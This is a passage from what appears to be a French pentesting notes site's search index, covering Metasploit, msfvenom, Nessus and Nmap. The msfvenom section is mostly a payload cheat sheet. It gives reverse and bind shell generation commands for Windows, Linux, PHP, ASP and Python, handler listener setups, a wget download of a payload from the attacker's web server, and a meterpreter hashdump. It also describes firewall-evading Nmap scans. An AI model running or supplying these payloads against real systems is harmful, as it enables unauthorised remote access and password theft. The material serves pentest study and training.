exploit(multi/handler) > Ensuite on peut chercher les modules de post exploitation disponibles. msf6 exploit(multi/handler) > search post/linux Une fois le module trouv\u00e9, on peut retourner dans la session meterpreter, et lancer le module. msf6 exploit(multi/handler) > sessions -i 1 [*] Starting interaction with 1... meterpreter > run post/linux/gather/hashdump","title":"Les commandes de base"},{"location":"metasploit_msfvenom/","text":"MSFVENOM de metasploit G\u00e9n\u00e9ralit\u00e9s MSFvenom est un g\u00e9n\u00e9rateur de payload autonome faisant partie de la suite Metasploit. Un payload est un fichier malveillant et son but est d\u2019obtenir des informations sur la machine sur laquelle il est ex\u00e9cut\u00e9. Il existe beaucoup de types de payload, en voici un bel assortiment sp\u00e9cialement con\u00e7u pour s\u2019adapter \u00e0 toutes les situations sur une machine Windows. Ici nous pouvons g\u00e9n\u00e9rer des PL shell ou meterpreter mais quelle est la diff\u00e9rence ? Un shell c\u2019est basique c\u2019est juste l\u2019invit\u00e9 de commandes, alors qu\u2019un meterpreter lui permet de lancer des commandes bien diff\u00e9rentes, tout en conservant l\u2019acc\u00e8s au shell basique. On peut lui demander par exemple d\u2019enregistrer l\u2019\u00e9cran de la victime, acc\u00e9der \u00e0 sa webcam, extraire ses mots de passe et bien plus encore. Syntaxe globale msfvenom msfvenom -p <payload> [options] T\u00e9l\u00e9charger un payload sur une machine cible Une fois qu'on est sur la machine cible, il faut pouvoir lui transmettre la payload. Pour cela il est possible d'utiliser un serveur web. Le plus simple \u00e9tant de g\u00e9n\u00e9rer un serveur web sur la machine attaquante (ayant la payload) via python. python3 -m http.server [PORT] Le port de base est 80 mais il est conseill\u00e9 d'utiliser un autre port tel que 9000. Ainsi on cr\u00e9e un serveur web sur la machine attaquante qui liste l'ensemble des fichiers de la machine attaquante. Il suffit ensuite de t\u00e9l\u00e9charger la payload sur la machine cible via la commande wget. sudo wget http://<IP>:<PORT>/payload Ex\u00e9cuter une payload sur une machine cible Il ne faut pas oublier de changer les droits du fichier ex\u00e9cutable de payload une fois sur la machine cible si on ne peut pas l'\u00e9x\u00e9cuter. chmod +x payload Types de payload Les payloads php /!\\ Les payloads php sont g\u00e9n\u00e9r\u00e9es avec des commentaires. Il faut donc supprimer les commentaires (en utilisant nano par exemple). Linux Executable and Linkable Format (ELF) Le format .elf est comparable au format .exe de Windows. Il s'agit de fichiers ex\u00e9cutables pour Linux. Cependant, vous devrez peut-\u00eatre vous assurer qu'ils disposent des droits d'ex\u00e9cution sur la machine cible. Par exemple, une fois que vous avez le fichier shell.elf sur votre machine cible, utilisez la commande chmod +x shell.elf pour accorder les permissions d'ex\u00e9cution. Une fois cela fait, vous pouvez ex\u00e9cuter ce fichier en tapant ./shell.elf sur la ligne de commande de la machine cible. msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > /home/kali/Bureau/payload.elf Windows msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe PHP msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php ASP msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp Python msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py Le bind shell Le Bind Shell c\u2019est quand la machine victime se connecte elle-m\u00eame au Kali. G\u00e9n\u00e9ration du payload : msfvenom -p windows/meterpreter/bind_tcp -f exe > /home/kali/Bureau/bind.exe Lancement du listener : sudo msfconsole msf6 > use exploit/multi/handler msf6 exploit(multi/handler) > set payload windows/meterpreter/bind_tcp msf6 exploit(multi/handler) > set LHOST <IP> msf6 exploit(multi/handler) > set LPORT <PORT> msf6 exploit(multi/handler) > run Le reverse TCP Avec le Reverse TCP c\u2019est le Kali Linux qui \u00e9coute sur un port et attends que la victime se connecte. G\u00e9n\u00e9ration du payload : msfvenom -p windows/meterpreter/reverse_tcp lhost= [IP] lport=5555 -f exe > /home/kali/Bureau/reverse_tcp.exe Lancement du listener : sudo msfconsole msf6 > use exploit/multi/handler msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp msf6 exploit(multi/handler) > set LHOST <IP> msf6 exploit(multi/handler) > set LPORT <PORT> msf6 exploit(multi/handler) > run Le HTTP payload Le HTTP payload permet d\u2019ouvrir une session sur une machine qui aurait ses ports de ferm\u00e9s, en passant par le port 443 ouvert par d\u00e9faut. G\u00e9n\u00e9ration du payload : msfvenom -p windows/meterpreter/reverse_https lhost= [IP] lport=443 -f exe > /home/kali/Bureau/reverse_https.exe Lancement du listener : sudo msfconsole msf6 > use exploit/multi/handler msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_https msf6 exploit(multi/handler) > set LHOST <IP> msf6 exploit(multi/handler) > set LPORT <PORT> msf6 exploit(multi/handler) > run Le Netcat Reverse shell G\u00e9n\u00e9ration du payload : msfvenom -p windows/shell_reverse_tcp ahost= [IP] lport=1111 -f exe > /home/kali/Bureau/ncshell.exe Lancement du listener : nc -lvp 1111 Windows Meterpreter msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe Windows Meterpreter (x64) msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe Windows Meterpreter (x86) msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe Windows Reverse Shell msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe Windows Reverse Shell (x64) msfvenom -p windows/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe Windows Reverse Shell (x86) msfvenom -p windows/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe Windows Reverse Shell (x86) (Non Staged) msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe","title":"Les shells"},{"location":"metasploit_msfvenom/#msfvenom-de-metasploit","text":"","title":"MSFVENOM de metasploit"},{"location":"metasploit_msfvenom/#generalites","text":"MSFvenom est un g\u00e9n\u00e9rateur de payload autonome faisant partie de la suite Metasploit. Un payload est un fichier malveillant et son but est d\u2019obtenir des informations sur la machine sur laquelle il est ex\u00e9cut\u00e9. Il existe beaucoup de types de payload, en voici un bel assortiment sp\u00e9cialement con\u00e7u pour s\u2019adapter \u00e0 toutes les situations sur une machine Windows. Ici nous pouvons g\u00e9n\u00e9rer des PL shell ou meterpreter mais quelle est la diff\u00e9rence ? Un shell c\u2019est basique c\u2019est juste l\u2019invit\u00e9 de commandes, alors qu\u2019un meterpreter lui permet de lancer des commandes bien diff\u00e9rentes, tout en conservant l\u2019acc\u00e8s au shell basique. On peut lui demander par exemple d\u2019enregistrer l\u2019\u00e9cran de la victime, acc\u00e9der \u00e0 sa webcam, extraire ses mots de passe et bien plus encore.","title":"G\u00e9n\u00e9ralit\u00e9s"},{"location":"metasploit_msfvenom/#syntaxe-globale-msfvenom","text":"msfvenom -p <payload> [options]","title":"Syntaxe globale msfvenom"},{"location":"metasploit_msfvenom/#telecharger-un-payload-sur-une-machine-cible","text":"Une fois qu'on est sur la machine cible, il faut pouvoir lui transmettre la payload. Pour cela il est possible d'utiliser un serveur web. Le plus simple \u00e9tant de g\u00e9n\u00e9rer un serveur web sur la machine attaquante (ayant la payload) via python. python3 -m http.server [PORT] Le port de base est 80 mais il est conseill\u00e9 d'utiliser un autre port tel que 9000. Ainsi on cr\u00e9e un serveur web sur la machine attaquante qui liste l'ensemble des fichiers de la machine attaquante. Il suffit ensuite de t\u00e9l\u00e9charger la payload sur la machine cible via la commande wget. sudo wget http://<IP>:<PORT>/payload","title":"T\u00e9l\u00e9charger un payload sur une machine cible"},{"location":"metasploit_msfvenom/#executer-une-payload-sur-une-machine-cible","text":"Il ne faut pas oublier de changer les droits du fichier ex\u00e9cutable de payload une fois sur la machine cible si on ne peut pas l'\u00e9x\u00e9cuter. chmod +x payload","title":"Ex\u00e9cuter une payload sur une machine cible"},{"location":"metasploit_msfvenom/#types-de-payload","text":"","title":"Types de payload"},{"location":"metasploit_msfvenom/#les-payloads-php","text":"/!\\ Les payloads php sont g\u00e9n\u00e9r\u00e9es avec des commentaires. Il faut donc supprimer les commentaires (en utilisant nano par exemple).","title":"Les payloads php"},{"location":"metasploit_msfvenom/#linux-executable-and-linkable-format-elf","text":"Le format .elf est comparable au format .exe de Windows. Il s'agit de fichiers ex\u00e9cutables pour Linux. Cependant, vous devrez peut-\u00eatre vous assurer qu'ils disposent des droits d'ex\u00e9cution sur la machine cible. Par exemple, une fois que vous avez le fichier shell.elf sur votre machine cible, utilisez la commande chmod +x shell.elf pour accorder les permissions d'ex\u00e9cution. Une fois cela fait, vous pouvez ex\u00e9cuter ce fichier en tapant ./shell.elf sur la ligne de commande de la machine cible. msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > /home/kali/Bureau/payload.elf","title":"Linux Executable and Linkable Format (ELF)"},{"location":"metasploit_msfvenom/#windows","text":"msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe","title":"Windows"},{"location":"metasploit_msfvenom/#php","text":"msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php","title":"PHP"},{"location":"metasploit_msfvenom/#asp","text":"msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp","title":"ASP"},{"location":"metasploit_msfvenom/#python","text":"msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py","title":"Python"},{"location":"metasploit_msfvenom/#le-bind-shell","text":"Le Bind Shell c\u2019est quand la machine victime se connecte elle-m\u00eame au Kali. G\u00e9n\u00e9ration du payload : msfvenom -p windows/meterpreter/bind_tcp -f exe > /home/kali/Bureau/bind.exe Lancement du listener : sudo msfconsole msf6 > use exploit/multi/handler msf6 exploit(multi/handler) > set payload windows/meterpreter/bind_tcp msf6 exploit(multi/handler) > set LHOST <IP> msf6 exploit(multi/handler) > set LPORT <PORT> msf6 exploit(multi/handler) > run","title":"Le bind shell"},{"location":"metasploit_msfvenom/#le-reverse-tcp","text":"Avec le Reverse TCP c\u2019est le Kali Linux qui \u00e9coute sur un port et attends que la victime se connecte. G\u00e9n\u00e9ration du payload : msfvenom -p windows/meterpreter/reverse_tcp lhost= [IP] lport=5555 -f exe > /home/kali/Bureau/reverse_tcp.exe Lancement du listener : sudo msfconsole msf6 > use exploit/multi/handler msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp msf6 exploit(multi/handler) > set LHOST <IP> msf6 exploit(multi/handler) > set LPORT <PORT> msf6 exploit(multi/handler) > run","title":"Le reverse TCP"},{"location":"metasploit_msfvenom/#le-http-payload","text":"Le HTTP payload permet d\u2019ouvrir une session sur une machine qui aurait ses ports de ferm\u00e9s, en passant par le port 443 ouvert par d\u00e9faut. G\u00e9n\u00e9ration du payload : msfvenom -p windows/meterpreter/reverse_https lhost= [IP] lport=443 -f exe > /home/kali/Bureau/reverse_https.exe Lancement du listener : sudo msfconsole msf6 > use exploit/multi/handler msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_https msf6 exploit(multi/handler) > set LHOST <IP> msf6 exploit(multi/handler) > set LPORT <PORT> msf6 exploit(multi/handler) > run","title":"Le HTTP payload"},{"location":"metasploit_msfvenom/#le-netcat-reverse-shell","text":"G\u00e9n\u00e9ration du payload : msfvenom -p windows/shell_reverse_tcp ahost= [IP] lport=1111 -f exe > /home/kali/Bureau/ncshell.exe Lancement du listener : nc -lvp 1111","title":"Le Netcat Reverse shell"},{"location":"metasploit_msfvenom/#windows-meterpreter","text":"msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe","title":"Windows Meterpreter"},{"location":"metasploit_msfvenom/#windows-meterpreter-x64","text":"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe","title":"Windows Meterpreter (x64)"},{"location":"metasploit_msfvenom/#windows-meterpreter-x86","text":"msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe","title":"Windows Meterpreter (x86)"},{"location":"metasploit_msfvenom/#windows-reverse-shell","text":"msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe","title":"Windows Reverse Shell"},{"location":"metasploit_msfvenom/#windows-reverse-shell-x64","text":"msfvenom -p windows/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe","title":"Windows Reverse Shell (x64)"},{"location":"metasploit_msfvenom/#windows-reverse-shell-x86","text":"msfvenom -p windows/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe","title":"Windows Reverse Shell (x86)"},{"location":"metasploit_msfvenom/#windows-reverse-shell-x86-non-staged","text":"msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe","title":"Windows Reverse Shell (x86) (Non Staged)"},{"location":"nessus_bases/","text":"Nessus Intro Nessus est un scanner de vuln\u00e9rabilit\u00e9s. Il permet de scanner un r\u00e9seau et de trouver les failles de s\u00e9curit\u00e9. Il utilise des techniques similaires \u00e0 Nmap pour trouver et signaler les vuln\u00e9rabilit\u00e9s, qui sont ensuite pr\u00e9sent\u00e9es dans une interface graphique agr\u00e9able \u00e0 consulter. Nessus est diff\u00e9rent des autres scanners car il ne fait pas de suppositions lors de l'analyse, comme supposer que l'application web fonctionne sur le port 80 par exemple. Nessus propose un service gratuit et un service payant, dans lequel certaines fonctionnalit\u00e9s sont exclues du service gratuit pour vous inciter \u00e0 acheter le service payant. Le prix est similaire \u00e0 celui de Burp Suite, donc \u00e0 moins que vous n'ayez un peu d'argent, nous utiliserons la version gratuite. Les prix sont ici : https://www.tenable.com/products/nessus Installation Pour installer Nessus, rendez-vous sur le site officiel de Nessus et t\u00e9l\u00e9chargez la version appropri\u00e9e pour votre syst\u00e8me d'exploitation. Il faut aussi s'enrigistrer sur le site : nessus login D\u00e9marrage de Nessus Pour d\u00e9marrer Nessus, il suffit de lancer le service nessusd.service. Pour moi, c'est dans le dossier /bin/systemctl. Pour lancer le service, il faut utiliser la commande suivante : sudo /bin/systemctl start nessusd.service Il suffit ensuite de se rendre sur firefox et de se connecter \u00e0 l'adresse suivante : https://localhost:8834 Fonctionnement de Nessus Nessus fonctionne en deux parties : un serveur et un client. Le serveur est le service que nous avons d\u00e9marr\u00e9 pr\u00e9c\u00e9demment. Le client est l'interface graphique que nous utilisons pour interagir avec le serveur. Le serveur est responsable de l'analyse des vuln\u00e9rabilit\u00e9s et le client est responsable de la configuration de l'analyse et de l'affichage des r\u00e9sultats. Configuration de Nessus Pour configurer Nessus, il faut se rendre sur l'interface web et se connecter. Une fois connect\u00e9, il faut cr\u00e9er un utilisateur. Cet utilisateur sera utilis\u00e9 pour se connecter \u00e0 l'interface web et pour se connecter au serveur Nessus. Une fois l'utilisateur cr\u00e9\u00e9, il faut se connecter \u00e0 l'interface web avec cet utilisateur. Une fois connect\u00e9, il faut cr\u00e9er un scan. Pour cr\u00e9er un scan, il faut cliquer sur le bouton \"New Scan\" en haut \u00e0 gauche de l'interface web. Configuration du scan Une fois le scan cr\u00e9\u00e9, il faut le configurer. Il faut lui donner un nom, une description et choisir le type de scan que l'on veut effectuer. Il existe plusieurs types de scan, mais nous utiliserons le scan \"Basic Network Scan\" pour l'instant. L'option \"Policies\" permet de cr\u00e9er des mod\u00e8les personnalis\u00e9s de scan. L'option \"Plugin Rules\" nous permet de modifier les propri\u00e9t\u00e9s des plugins, par exemple en les masquant ou en modifiant leur gravit\u00e9","title":"Les bases"},{"location":"nessus_bases/#nessus","text":"","title":"Nessus"},{"location":"nessus_bases/#intro","text":"Nessus est un scanner de vuln\u00e9rabilit\u00e9s. Il permet de scanner un r\u00e9seau et de trouver les failles de s\u00e9curit\u00e9. Il utilise des techniques similaires \u00e0 Nmap pour trouver et signaler les vuln\u00e9rabilit\u00e9s, qui sont ensuite pr\u00e9sent\u00e9es dans une interface graphique agr\u00e9able \u00e0 consulter. Nessus est diff\u00e9rent des autres scanners car il ne fait pas de suppositions lors de l'analyse, comme supposer que l'application web fonctionne sur le port 80 par exemple. Nessus propose un service gratuit et un service payant, dans lequel certaines fonctionnalit\u00e9s sont exclues du service gratuit pour vous inciter \u00e0 acheter le service payant. Le prix est similaire \u00e0 celui de Burp Suite, donc \u00e0 moins que vous n'ayez un peu d'argent, nous utiliserons la version gratuite. Les prix sont ici : https://www.tenable.com/products/nessus","title":"Intro"},{"location":"nessus_bases/#installation","text":"Pour installer Nessus, rendez-vous sur le site officiel de Nessus et t\u00e9l\u00e9chargez la version appropri\u00e9e pour votre syst\u00e8me d'exploitation. Il faut aussi s'enrigistrer sur le site : nessus login","title":"Installation"},{"location":"nessus_bases/#demarrage-de-nessus","text":"Pour d\u00e9marrer Nessus, il suffit de lancer le service nessusd.service. Pour moi, c'est dans le dossier /bin/systemctl. Pour lancer le service, il faut utiliser la commande suivante : sudo /bin/systemctl start nessusd.service Il suffit ensuite de se rendre sur firefox et de se connecter \u00e0 l'adresse suivante : https://localhost:8834","title":"D\u00e9marrage de Nessus"},{"location":"nessus_bases/#fonctionnement-de-nessus","text":"Nessus fonctionne en deux parties : un serveur et un client. Le serveur est le service que nous avons d\u00e9marr\u00e9 pr\u00e9c\u00e9demment. Le client est l'interface graphique que nous utilisons pour interagir avec le serveur. Le serveur est responsable de l'analyse des vuln\u00e9rabilit\u00e9s et le client est responsable de la configuration de l'analyse et de l'affichage des r\u00e9sultats.","title":"Fonctionnement de Nessus"},{"location":"nessus_bases/#configuration-de-nessus","text":"Pour configurer Nessus, il faut se rendre sur l'interface web et se connecter. Une fois connect\u00e9, il faut cr\u00e9er un utilisateur. Cet utilisateur sera utilis\u00e9 pour se connecter \u00e0 l'interface web et pour se connecter au serveur Nessus. Une fois l'utilisateur cr\u00e9\u00e9, il faut se connecter \u00e0 l'interface web avec cet utilisateur. Une fois connect\u00e9, il faut cr\u00e9er un scan. Pour cr\u00e9er un scan, il faut cliquer sur le bouton \"New Scan\" en haut \u00e0 gauche de l'interface web.","title":"Configuration de Nessus"},{"location":"nessus_bases/#configuration-du-scan","text":"Une fois le scan cr\u00e9\u00e9, il faut le configurer. Il faut lui donner un nom, une description et choisir le type de scan que l'on veut effectuer. Il existe plusieurs types de scan, mais nous utiliserons le scan \"Basic Network Scan\" pour l'instant. L'option \"Policies\" permet de cr\u00e9er des mod\u00e8les personnalis\u00e9s de scan. L'option \"Plugin Rules\" nous permet de modifier les propri\u00e9t\u00e9s des plugins, par exemple en les masquant ou en modifiant leur gravit\u00e9","title":"Configuration du scan"},{"location":"nmap_bases_scan/","text":"Les bases de Nmap : les scans La base des bases c'est de faire un man nmap Pour voir tous les switchs disponibles. Une autre mani\u00e8re d'avoir des infos est d'aller sur : le site officiel nmap Scan du r\u00e9seau Pour commencer et avoir une vue d'ensemble du r\u00e9seau le mieux est de connaitre les IPs des machines actives sur le r\u00e9seau local. Pour faire \u00e7a on peut demander \u00e0 nmap de faire un scan de type ping (protocole ICMP) en utilisant -sn . Il faut donner le masque du r\u00e9seau sur lequel il va faire son scan avec un /24 (ou /16 ou /8 ou autre) avec l'ip du broadcast ou alors mettre des * : nmap -sn -vv 192.168.0.0-254 nmap -sn -vv 192.168.0.0/24 nmap -sn -vv 192.168.0.* Pro tip : pour n'afficher que les hosts qui sont up on peut associer \u00e0 la commande nmap : grep -v \"down\" qui demande de ne pas afficher toutes les lignes o\u00f9 il y a marqu\u00e9 \"down\" Rappel, le -vv c'est pour verbosity c'est pour que les r\u00e9sultats soient affich\u00e9s avec plus de d\u00e9tails. -v donne un niveau de d\u00e9tail, -vv en donne 2. Les scans basiques et moins basiques Les scans basiques : * Scan de connexion TCP : -sT * Scan de connexion SYN ( TCP discret ou demi-ouvert) : -sS * Scan de connexion UDP : -sU Les moins basiques : * Scan de connexion NULL (TCP sans flag) : -sN * Scan de conexion FIN (TCP avec flag de fermeture) : -sF * Scan de connexion Xmas (TCP avec 3 flags) : -sX TCP basique (scan de base de Nmap sans sudo) En utilisant le switch -sT , Nmap va essayer une connexion TCP/IP ( 3 way handshake), il envoie un paquet de synchronisation SYN puis s'attend \u00e0 recevoir un packet de synchronisation et de prise en compte : SYN/ACK et finit par r\u00e9pondre un packet de prise en compte : ACK (acknoledgement). Si la connexion est ferm\u00e9e, pour toute requ\u00eate SYN sera envoy\u00e9 un paquet de rejet appel\u00e9 reset : RST Petit rappel, apr\u00e8s une connexion compl\u00e8te TCP/IP, on a un flux d'ouvert qu'il faut penser \u00e0 fermer. Si le port est derri\u00e8re un firewall, le peu importe qu'il soit ouvert ou non, si notre flux n'est pas explicitement ouvert notre SYN sera drop par le firewall et on resevra un RST donc ce n'est pas forc\u00e9ment le meilleur moyen de connaitre les ports ouverts Scan SYN (scan de base de Nmap en sudo) C'est un scan plus discret car dit \u00e0 moiti\u00e9 ouvert. Il se lance avec -sS . Nmap va envoyer un requ\u00eate SYN puis s'il re\u00e7oit une r\u00e9ponse SYN/ACK, au lieu d'ouvrir le flux en envoyant un paquet ACK, il envoie un packet RST. Il ferme donc directement le flux mais prend connaissance que le port est ouvert. Avantages : * Il peut \u00eatre utilis\u00e9 pour contourner les anciens syst\u00e8mes de d\u00e9tection d'intrusion, car ils recherchent une poign\u00e9e de main compl\u00e8te \u00e0 trois voies. Ce n'est souvent plus le cas avec les solutions IDS modernes ; c'est pour cette raison que les analyses SYN sont encore souvent appel\u00e9es analyses \"furtives\". * Les analyses SYN ne sont souvent pas enregistr\u00e9es par les applications qui \u00e9coutent sur des ports ouverts, car la pratique courante consiste \u00e0 enregistrer une connexion une fois qu'elle a \u00e9t\u00e9 enti\u00e8rement \u00e9tablie. Une fois de plus, cela contribue \u00e0 l'id\u00e9e que les analyses SYN sont furtives. * Sans avoir \u00e0 se pr\u00e9occuper de l'\u00e9tablissement (et de la d\u00e9connexion) d'une poign\u00e9e de main \u00e0 trois voies pour chaque port, les balayages SYN sont nettement plus rapides qu'un balayage TCP Connect standard. Inconv\u00e9nients : * Ils n\u00e9cessitent les permissions sudo pour fonctionner correctement sous Linux. En effet, les analyses SYN n\u00e9cessitent la capacit\u00e9 de cr\u00e9er des paquets bruts (par opposition \u00e0 la poign\u00e9e de main TCP compl\u00e8te), ce qui est un privil\u00e8ge que seul l'utilisateur root poss\u00e8de par d\u00e9faut. * Les services instables sont parfois interrompus par les analyses SYN, ce qui peut s'av\u00e9rer probl\u00e9matique si un client a fourni un environnement de production pour le test. En d\u00e9finitive, les avantages l'emportent sur les inconv\u00e9nients. Pour cette raison, les scans SYN sont les scans par d\u00e9faut utilis\u00e9s par Nmap s'il est ex\u00e9cut\u00e9 avec les permissions sudo. S'il est ex\u00e9cut\u00e9 sans les permissions sudo, Nmap utilise par d\u00e9faut le scan TCP Connect que nous avons vu dans la t\u00e2che pr\u00e9c\u00e9dente Scan UDP Les scans UDP sont tr\u00e8s lent car le protocole UDP est fait pour la rapidit\u00e9 et n'a pas \"d'accus\u00e9 de r\u00e9ception\", on peut connaitre les ports ferm\u00e9s mais on ne peut pas diff\u00e9rencier les ports ouverts de ceux bloqu\u00e9s par firewall (et qui drop les paquets). On l'active avec -sU . Lorsqu'un paquet est envoy\u00e9 \u00e0 un port UDP ouvert, il ne devrait pas y avoir de r\u00e9ponse. Lorsque cela se produit, Nmap se r\u00e9f\u00e8re au port comme \u00e9tant ouvert|filtr\u00e9. En d'autres termes, il suspecte que le port est ouvert, mais qu'il pourrait \u00eatre prot\u00e9g\u00e9 par un pare-feu. S'il obtient une r\u00e9ponse UDP (ce qui est tr\u00e8s inhabituel), le port est marqu\u00e9 comme ouvert. Le plus souvent, il n'y a pas de r\u00e9ponse, auquel cas la demande est envoy\u00e9e une deuxi\u00e8me fois pour une double v\u00e9rification. S'il n'y a toujours pas de r\u00e9ponse, le port est marqu\u00e9 comme ouvert|filtr\u00e9 et Nmap continue. Lorsqu'un paquet est envoy\u00e9 \u00e0 un port UDP ferm\u00e9, la cible doit r\u00e9pondre par un paquet ICMP (ping) contenant un message indiquant que le port est inaccessible. Cela identifie clairement les ports ferm\u00e9s, que Nmap marque comme tels et passe \u00e0 autre chose. *Lorsqu'il scanne des ports UDP, Nmap envoie g\u00e9n\u00e9ralement des requ\u00eates compl\u00e8tement vides - juste des paquets UDP bruts. Cela dit, pour les ports qui sont g\u00e9n\u00e9ralement occup\u00e9s par des services bien connus, il enverra plut\u00f4t une charge utile sp\u00e9cifique au protocole qui est plus susceptible de susciter une r\u00e9ponse \u00e0 partir de laquelle un r\u00e9sultat plus pr\u00e9cis peut \u00eatre tir\u00e9. * Am\u00e9liorer la rapidit\u00e9 du scan Comme le scan UDP est uuuuultra lent on peut le lancer que sur les ports les plus connus/fr\u00e9quement utilis\u00e9s. Par exemple si on veut faire le scan que sur les 50 ports les plus connus on peut faire : --top-ports 50 On peut faire \u00e7a avec n'importe quel type de scan mais celui avec lequel c'est le plus utilis\u00e9 est avec le scan udp : nmap -sU --top-ports 50 192.10.0.5 Contourner les firewall Ces 3 scans sont encore un peu plus furtifs que le scan SYN. L'objectif ici est, bien s\u00fbr, d'\u00e9chapper aux pare-feux. De nombreux pare-feux sont configur\u00e9s pour rejeter les paquets TCP entrants vers les ports bloqu\u00e9s qui ont le drapeau SYN activ\u00e9 (bloquant ainsi les nouvelles demandes d'\u00e9tablissement de connexion). En envoyant des demandes qui ne contiennent pas le drapeau SYN, nous contournons efficacement ce type de pare-feu. Bien que ce soit une bonne chose en th\u00e9orie, la plupart des solutions IDS modernes sont sensibles \u00e0 ces types d'analyse, il ne faut donc pas compter sur leur efficacit\u00e9 \u00e0 100 % lorsqu'il s'agit de syst\u00e8mes modernes. Attention, en pratique Microsoft Windows (et un grand nombre de dispositifs de r\u00e9seau Cisco) sont connus pour r\u00e9pondre par un RST \u00e0 tout paquet TCP malform\u00e9, que le port soit ouvert ou non. Il en r\u00e9sulte que tous les ports apparaissent comme \u00e9tant ferm\u00e9s. Scan NULL -sN Simplement, le scan envoie une requ\u00eate TCP remplie de 0 et attend en retour une r\u00e9ponse de RST. Scan FIN -sF Le scan envoie une requ\u00eate TCP avec uniquement le bit de \"FIN\" d'activ\u00e9 et s'attend \u00e0 une r\u00e9ponse RST. Scan Xmas -sX Le scan envoie un req\u00eate TCP avec les bits Urgent(URG), Push (PSH) et Fin (FIN) d'activ\u00e9s Rappel sur la structure d'un flag TCP/IP : 3 octets compos\u00e9s de : * 3 bits r\u00e9serv\u00e9s - 1 bit \"Nonce\" * 1 bit CWR (Congestion Windows Reduced) - 1 bit ECN (Echo) - 1 bit URG (Urgent) - 1 bit ACK (Acknoledgement) * 1 bit PSH (Push) - 1 bit RST (Reset) - 1 bit SYN (Synchronisation) - 1 bit FIN","title":"Les scans"},{"location":"nmap_bases_scan/#les-bases-de-nmap-les-scans","text":"La base des bases c'est de faire un man nmap Pour voir tous les switchs disponibles. Une autre mani\u00e8re d'avoir des infos est d'aller sur : le site officiel nmap","title":"Les bases de Nmap : les scans"},{"location":"nmap_bases_scan/#scan-du-reseau","text":"Pour commencer et avoir une vue d'ensemble du r\u00e9seau le mieux est de connaitre les IPs des machines actives sur le r\u00e9seau local. Pour faire \u00e7a on peut demander \u00e0 nmap de faire un scan de type ping (protocole ICMP) en utilisant -sn . Il faut donner le masque du r\u00e9seau sur lequel il va faire son scan avec un /24 (ou /16 ou /8 ou autre) avec l'ip du broadcast ou alors mettre des * : nmap -sn -vv 192.168.0.0-254 nmap -sn -vv 192.168.0.0/24 nmap -sn -vv 192.168.0.* Pro tip : pour n'afficher que les hosts qui sont up on peut associer \u00e0 la commande nmap : grep -v \"down\" qui demande de ne pas afficher toutes les lignes o\u00f9 il y a marqu\u00e9 \"down\" Rappel, le -vv c'est pour verbosity c'est pour que les r\u00e9sultats soient affich\u00e9s avec plus de d\u00e9tails. -v donne un niveau de d\u00e9tail, -vv en donne 2.","title":"Scan du r\u00e9seau"},{"location":"nmap_bases_scan/#les-scans-basiques-et-moins-basiques","text":"Les scans basiques : * Scan de connexion TCP : -sT * Scan de connexion SYN ( TCP discret ou demi-ouvert) : -sS * Scan de connexion UDP : -sU Les moins basiques : * Scan de connexion NULL (TCP sans flag) : -sN * Scan de conexion FIN (TCP avec flag de fermeture) : -sF * Scan de connexion Xmas (TCP avec 3 flags) : -sX","title":"Les scans basiques et moins basiques"},{"location":"nmap_bases_scan/#tcp-basique-scan-de-base-de-nmap-sans-sudo","text":"En utilisant le switch -sT , Nmap va essayer une connexion TCP/IP ( 3 way handshake), il envoie un paquet de synchronisation SYN puis s'attend \u00e0 recevoir un packet de synchronisation et de prise en compte : SYN/ACK et finit par r\u00e9pondre un packet de prise en compte : ACK (acknoledgement). Si la connexion est ferm\u00e9e, pour toute requ\u00eate SYN sera envoy\u00e9 un paquet de rejet appel\u00e9 reset : RST Petit rappel, apr\u00e8s une connexion compl\u00e8te TCP/IP, on a un flux d'ouvert qu'il faut penser \u00e0 fermer. Si le port est derri\u00e8re un firewall, le peu importe qu'il soit ouvert ou non, si notre flux n'est pas explicitement ouvert notre SYN sera drop par le firewall et on resevra un RST donc ce n'est pas forc\u00e9ment le meilleur moyen de connaitre les ports ouverts","title":"TCP basique (scan de base de Nmap sans sudo)"},{"location":"nmap_bases_scan/#scan-syn-scan-de-base-de-nmap-en-sudo","text":"C'est un scan plus discret car dit 